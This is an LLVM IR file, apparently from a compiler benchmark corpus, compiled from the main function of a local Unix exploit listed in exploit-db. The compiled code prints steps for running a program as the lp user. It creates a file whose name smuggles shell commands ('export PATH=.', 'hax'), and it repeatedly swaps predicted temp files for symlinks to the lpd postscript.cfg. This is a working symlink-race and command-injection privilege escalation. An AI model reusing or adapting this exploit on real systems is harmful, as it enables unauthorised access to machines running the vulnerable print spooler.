; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20923.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20923.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [43 x i8] c"Put the stuff to run as lp:lp in /tmp/hax\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"the lpr /usr/share/aspe<tab>/manual.dvi\0A\00", align 1
@.str.2 = private unnamed_addr constant [60 x i8] c"when the ! comes up, wait a second, then press control-C.\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"Then print something.\0A\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [83 x i8] c"/var/lib/texmf/cd ..\0Acd ..\0Acd ..\0Acd ..\0Acd ..\0Acd ..\0Acd tmp\0Aexport PATH=.\0Ahax\0Aexit 0\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"!\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"/var/spool/lpd/lp/postscript.cfg\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1000 x i8], align 16
  %3 = alloca [1000 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %7 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.2, i64 0, i64 0))
  %9 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  %10 = call i32 @open(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.4, i64 0, i64 0), i32 65, i32 438)
  %11 = call i32 @close(i32 %10)
  br label %12

12:                                               ; preds = %0, %38
  %13 = call i32 (...) @shake()
  store i32 %13, i32* %5, align 4
  store i32 -30, i32* %4, align 4
  br label %14

14:                                               ; preds = %35, %12
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 0
  br i1 %16, label %17, label %38

17:                                               ; preds = %14
  %18 = getelementptr inbounds [1000 x i8], [1000 x i8]* %2, i64 0, i64 0
  %19 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %20 = load i32, i32* %4, align 4
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %20, %21
  %23 = call i32 @cow(i8* %18, i8* %19, i32 %22)
  %24 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %25 = call i32 @access(i8* %24, i32 0)
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %34, label %27

27:                                               ; preds = %17
  %28 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %29 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %30 = call i32 @unlink(i8* %29)
  %31 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  %32 = call i32 @symlink(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i8* %31)
  %33 = call i32 @sleep(i32 1)
  br label %34

34:                                               ; preds = %27, %17
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %4, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %4, align 4
  br label %14

38:                                               ; preds = %14
  br label %12
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @shake(...) #1

declare dso_local i32 @cow(i8*, i8*, i32) #1

declare dso_local i32 @access(i8*, i32) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @symlink(i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
